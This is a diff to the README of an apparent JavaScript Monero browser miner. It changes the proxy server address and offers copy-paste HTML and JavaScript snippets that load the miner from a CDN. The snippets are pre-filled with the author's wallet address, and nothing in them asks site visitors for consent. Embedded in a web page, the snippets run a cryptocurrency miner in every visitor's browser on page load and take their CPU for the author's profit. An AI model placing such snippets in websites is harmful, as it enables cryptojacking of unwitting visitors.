@@ -15,10 +15,10 @@ In index.Html you can configure it your preferences
 
 
 ```javascript
-server = "wss://45.119.82.33:40725";
+server = "wss://ny1.xmrminingproxy.com";
     var pool = "gulf.moneroocean.stream:80";
     var walletAddress = "INSERT YOUR ADDRESS HERE";
-    var workerId = "INSERT NODE NAME"
+    var workerId = "INSERT WORKER NAME"
     var threads = -1;
     var password = "";
     startMining(pool, walletAddress, workerId, threads, password);
@@ -39,7 +39,7 @@ Go to https://moneroocean.stream. This is the pool you are connected to, it will
 
 1. Open https://monero-webminer.vercel.app/
 2. Also Open https://moneroocean.stream in a new tab
-3. Paste in my XMR Address 4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi
+3. Paste in my Monero Address `4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi`
 4. You will see that "GH-XMR" is Mining. You can also do the same 
 
 # Use In Other Projects 
@@ -50,7 +50,7 @@ HTML
     <!-- Start Of Mining Code (HTML) -->
     <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
     <script>
-        server = "wss://45.119.82.33:40725";
+        server = "wss://ny1.xmrminingproxy.com";
         var pool = "moneroocean.stream";
         var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
         var workerId = "GH-XMR"
@@ -74,7 +74,7 @@ Javascript
     script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
     document.head.appendChild(script);
 
-    server = "wss://45.119.82.33:40725";
+    server = "wss://ny1.xmrminingproxy.com";
     var pool = "moneroocean.stream";
     var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
     var workerId = "GH-XMR"
